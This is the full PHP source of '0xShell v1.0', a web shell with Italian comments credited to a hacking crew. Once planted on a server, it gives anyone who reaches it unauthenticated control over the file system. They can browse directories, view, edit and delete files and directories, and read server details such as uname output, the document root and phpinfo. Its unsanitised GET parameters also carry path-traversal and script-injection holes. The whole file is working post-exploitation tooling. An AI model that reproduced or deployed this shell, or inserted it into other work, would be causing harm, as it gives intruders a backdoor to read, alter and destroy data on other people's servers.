<?php
/* *
 * 
 * 0xShell ~ http://0xproject.hellospace.net/
 * Autore: KinG-InFeT [ http://www.kinginfet.net/ ] , WhiteSecurity Crew [ http://whitesecurity.hellospace.net/ ]
 * Licenza: GPL
 * Versione: v1.0
 *
 *  Note: Ovviamente questa è una prima release, una base ...ovviamente sarà in continuo aggiornamento,
 *            l'ho voluto pubblicare siccome a pasqua non ci sono :P
 *
 *
 *  Release pubblicata il: 31 Marzo 2010
 *
 *
 * */ 
 
 /* *
  *
  * CHANGELOG_
  *
  *  0xShell v1.0
  *  [+] Possibilità di navigare tra i vari file e directory
  *  [+] Possibilità di eliminare file
  *  [+] Possibilità di eliminare directory
  *  [+] Possibilità di editare un file
  *  [+] Possibilità di creare una directory
  *  [+] Possibilità di visionare il phpinfo()
  *  [+] Possibilità di visualizzare il contenuto di un file
  *  [+] Possibilità di visionare i permessi su directory e file sia in stile UNIX che in stile Numerico
  *  [+] Inserite molte informazioni riguardante il server poste in alto
  *  [+] Possibilità di effettuare un whois dell'IP del server in cui risiede la shell
  *
  * */

error_reporting(E_ALL ^ E_NOTICE);
define("VERSION","1.0");

function check_safe_mode() {
	if (ini_get('safe_mode') == FALSE)
		$safemode = "<font color='green'>OFF</font>";
	else
		$safemode = "<font color='red'>ON</font>";
	return $safemode;
}

function get_perms($file,$type) {
	switch($type) {
		case 1;
			$mode=fileperms($file);
			$perms .= ($mode & 00400) ? 'r' : '-';
			$perms .= ($mode & 00200) ? 'w' : '-';
			$perms .= ($mode & 00100) ? 'x' : '-';
			$perms .= ($mode & 00040) ? 'r' : '-';
			$perms .= ($mode & 00020) ? 'w' : '-';
			$perms .= ($mode & 00010) ? 'x' : '-';
			$perms .= ($mode & 00004) ? 'r' : '-';
			$perms .= ($mode & 00002) ? 'w' : '-';
			$perms .= ($mode & 00001) ? 'x' : '-';
		break;
		
		case 2;
			$perms = substr(sprintf('%o', fileperms($file)), -4);
		break;
	}
	
return $perms;
}

function del_dir($dirname) {
if(is_dir($dirname)){
		$handle = opendir($dirname);
		while (FALSE !== ($file = readdir($handle))) { 
			if(is_file($dirname.$file)){
				unlink($dirname.$file);
			}
		}
		$handle = closedir($handle);
		if(rmdir($dirname))
			return TRUE;
		else
			return FALSE;
	}else
		return FALSE;
}
$patch = $_SERVER['PHP_SELF'];
$dir = $_GET['dir'];
$remove_file = $_GET['remove_file'];
$view_file = $_GET['view_file'];
$edit_file = $_GET['edit_file'];
$rmdir = $_GET['rmdir'];
$action = $_GET['action'];
?>
<html>
<head>
<title>0xShell v <?php echo VERSION; ?></title>
<style type="text/css">
table {
	background-color: #000000;
	color: #FFFFFF;
	font-family: verdana;
	font-size: 10px;
	cursor: default;
	border-spacing: 1px;
	margin-left: auto;
	margin-right: auto;
	width: 900px;
	border-width: 1px;
	border:1px solid #333;
	padding: 10px;
}

input,textarea,select {
	font: normal 11px Verdana, Arial, Helvetica, sans-serif;
	background-color:black;
	color:#a6a6a6;
	border: solid 1px #363636;
}

a:link,a:visited,a:active {
	font-family: verdana;
	font-size: 10px;
	text-decoration: none;
	color: #FFFFFF;
	cursor: default;
}

pre {
	background-color: #666666;
	text-align: left;
	padding: 10px;
}

a:hover{
	color: #D3D3D3;
}
</style>
</head>
<body bgcolor='#000000' text='#ebebeb' link='#ebebeb' alink='#ebebeb' vlink='#ebebeb'>
<h2 align="center"><code><a href="<?php echo $patch; ?>"><font size="4">[~]</font></a> 0xShell v <?php echo VERSION; ?><blink>_</blink></code></h2>      

</div><br />
<table>
<tr><td>[~] Uname -a: <u><?php echo exec("uname -a"); ?></u></td></tr>
<tr><td>[~] Kernel Version: <u><?php echo exec("uname -r"); ?></u></td></tr>
<tr><td>[~] Server Address: <u> <?php echo $_SERVER['SERVER_ADDR']; ?></u></td></tr>
<tr><td>[~] Whois Server: <?php echo "<a href='http://whois.domaintools.com/".$_SERVER['SERVER_ADDR']."'>Click Here</a>"; ?></td></tr>
<tr><td>[~] Server Name: <u><?php echo $_SERVER['SERVER_NAME']; ?></u></td></tr>
<tr><td>[~] Server Software: <u><?php echo $_SERVER['SERVER_SOFTWARE']; ?></u></td></tr>
<tr><td>[~] Charset: <u> <?php echo $_SERVER['HTTP_ACCEPT_CHARSET']; ?></u></td></tr>
<tr><td>[~] IP Address: <u><?php echo $_SERVER['REMOTE_ADDR']; ?></u></td></tr>
<tr><td>[~] User Agent: <u><?php echo htmlspecialchars($_SERVER['HTTP_USER_AGENT']); ?></u></td></tr>
<tr><td>[~] Patch: <u><?php echo $_SERVER['DOCUMENT_ROOT']; ?></u></td></tr>
<tr><td>[~] Safe Mode: <?php echo check_safe_mode(); ?></td></tr>
</table>
<p></p>
<div align="center">
<a href="?action=phpinfo" >[PHP-Info]</a> - <a href="?action=mkdir" >[Crea Directory]</a>
<br /><br /><br />
<div align="center">
<?php
switch($action) {//varie azioni
	case 'phpinfo'; //visualizzo in phpinfo()
		die(phpinfo());
	break;
	
	case 'mkdir';//crea una directory
		echo "<form method=\"POST\" action=\"".$patch."?action=mkdir&work=ok\" />\n";
		echo "Directory Name: <input type='test' name='dir_name' /><br />\n";
		echo "<input type='submit' value='Create' /></form>";
		if($_GET['work'] == 'ok') {
			if(mkdir($_POST['dir_name']))
				echo "<script>alert('Directory Created'); window.location=\"".$patch."\";</script>";
			else
				echo "<script>alert('Directory Not Created'); window.location=\"".$patch."\";</script>";
		}
	break;
}

if(isset($remove_file)) {  //Rimozione file
	if(!(is_writable($remove_file)))
		die("File Not Deleted");
	if(unlink($remove_file))
		echo "<script>alert('File Deleted'); location.href='$patch';</script>";
	else
		echo "<script>alert('File Not Deleted'); location.href='$patch';</script>";
}

if(isset($view_file)) {  //view file
	if(!(is_readable($view_file)))
		die("File Not View");
	else
		echo "<b>View File: ".$view_file."</b><br /><pre>".htmlentities(file_get_contents($view_file))."</pre>";
}

if(isset($edit_file)) {  //editing file :D
	if(!(is_writable($edit_file)))
		die("File Not Writable");
	$text = htmlspecialchars(join(file($edit_file)));

	echo "<center>";
	echo "<form method=\"POST\" action=\"$file?edit_file=$edit_file&work=yes \">";
	echo "<textarea rows=\"30\" cols=\"150\" name=\"text\">$text</textarea>";
	echo "<br><input type=\"submit\" value=\"Edit File\">";
	echo "</form></center>";
	if(@$_GET['work'] == 'yes') {
		if(file_exists($edit_file)) {
			$edit =fopen($edit_file,'w+');
			$new_text = stripslashes($_POST['text']);
			fwrite($edit,$new_text);
			fclose($edit);
			print "<script>alert(\"FIle Edited Seccess\"); window.location=\"".$patch."\";</script>";
		}
	}
}

if(isset($rmdir)) {  //delete directory
	$rmdir = $rmdir."/";
	if(del_dir($rmdir) == TRUE)
		die("<script>alert('Directory Deleted'); window.location=\"".$patch."\";</script>");
	else
		die("<script>alert('Directory Created'); window.location=\"".$patch."\";</script>");
}
?>
</div>
</div>
<table>
<tr><td>File/Directory</td>
<td>Remove?</td>
<td>View?</td>
<td>Edit?</td>
<td>Permess</td></tr>
<tr><td><hr></td>
<td><hr></td>
<td><hr></td>
<td><hr></td>
<td><hr></td></tr>
<?php
if(isset($dir)) 
	chdir($dir);
echo "<tr><td><a href=\"".$patch."?dir=".htmlspecialchars($_GET['dir'])."/..\">..</a></td></tr>\n";
foreach (glob("*") as $file) {
	$perms_unix = get_perms($file,1);
	$perms_num = get_perms($file,2);

	if(is_file($file)) {
		if(isset($dir)) {
   			echo "<tr><td><a href=$dir/$patchs>$file</a></td>\n";
			echo "<td><a href=$patch?remove_file=$dir/$file>Remove</a></td>\n";
			echo "<td><a href=$patch?view_file=$dir/$file>View</a></td>\n";
			echo "<td><a href=$patch?edit_file=$dir/$file>Edit</a></td>\n";
			echo "<td  >$perms_unix /~/ $perms_num</td></tr>\n";
		}else{
			echo "<tr><td><a href=$file>$file</a></td>\n";
			echo "<td><a href=$patch?remove_file=$file>Remove</a></td>\n";
			echo "<td><a href=$patch?view_file=$file>View</a></td>\n";
			echo "<td><a href=$patch?edit_file=$file>Edit</a></td>\n";
			echo "<td  >$perms_unix /~/ $perms_num</td></tr>\n";
		}
	}

	if(is_dir($file)) {
		if(isset($dir)) {
			echo "<tr><td><a href=$file>$file</td>\n";
			echo "<td><a href=$patch?rmdir=$dir/$file>Remove</a></td>\n";
			echo "<td><a href=$patch?dir=$dir/$file><u>DIR</u></td><td>Directory</td>\n";
			echo "<td  >$perms_unix /~/ $perms_num</td></tr>\n";
		}else{
			echo "<tr><td><a href=$file>$file</a></td>\n";
			echo "<td><a href=$patch?rmdir=$file>Remove</a></td>\n";
			echo "<td><a href=$patch?dir=$file><u>DIR</u></td><td>Directory</td>\n";
			echo "<td  >$perms_unix /~/ $perms_num</td></tr>\n";
		}
	}
}   
   echo "</table>";
   ?>
   <br />
   <table>
   <tr>
<td valign='top'>
<center>
<b><font size='1'>[ ~ Powered by <a href='http://www.kinginfet.net/'>KinG-InFeT</a> | <a href='http://whitesecurity.hellospace.net/'>WhiteSecurity Crew</a> - Version v<?php echo VERSION; ?> ~ ]</b>
</font>
</center>
</td>
</tr>
</table>
</body>
</html>
